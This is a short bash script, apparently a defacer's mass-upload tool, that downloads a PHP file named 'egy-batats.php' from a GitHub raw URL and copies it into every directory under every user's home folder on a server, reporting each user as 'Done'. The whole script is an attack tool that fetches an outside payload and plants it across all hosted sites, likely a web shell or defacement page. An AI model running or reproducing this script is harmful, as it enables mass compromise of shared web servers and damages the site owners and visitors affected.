#!/bin/bash
#love_betohat_"BAH"
wget https://raw.githubusercontent.com/BETO-2FA/TXT-SOURCE/main/egy-batats.php -O /root/egy-batats.php
mkdir /tmp/hello-index
ls -la /home/ | awk '{print $9}' > /tmp/betobeh
for i in `more /tmp/betobeh `
do
	find /home/$i -type d -exec cp /root/egy-batats.php {} \;
	echo " [*] $i -> Done"
done
